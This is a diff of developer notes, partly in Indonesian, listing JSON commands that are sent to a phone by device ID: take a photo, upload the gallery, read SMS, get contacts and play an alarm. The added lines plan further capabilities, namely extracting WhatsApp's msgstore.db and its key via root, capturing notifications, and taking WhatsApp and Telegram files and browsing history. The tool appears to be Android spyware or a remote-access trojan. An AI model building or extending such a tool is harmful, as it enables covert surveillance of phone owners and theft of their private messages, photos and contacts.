@@ -8,8 +8,7 @@ command
         "message": "Sudah waktunya istirahat"
     }
 }
-
-# take foto 
+# take_foto 
 {
     "device_id": "98fbff301bd1c6ea",
     "command": "take_photo",
@@ -45,10 +44,11 @@ upload_gallery
 get SMS
 {
   "device_id": "98fbff301bd1c6ea",
-  "command": "get_sms",
+  "command": "get_sms", ~> telegram=>100%, whatsapp ?
   "params": {}
 }
 
+msgstore.db whatsappkey -> root  > $$$$
 get get_contact
 {
   "device_id": "98fbff301bd1c6ea",
@@ -82,3 +82,8 @@ play_alarm_now
     "duration": 10
   }
 }
+
+kirim link => baca ()
+notifikasi aja di capture
+file whatsapp, telegram,
+riwayat browsing?
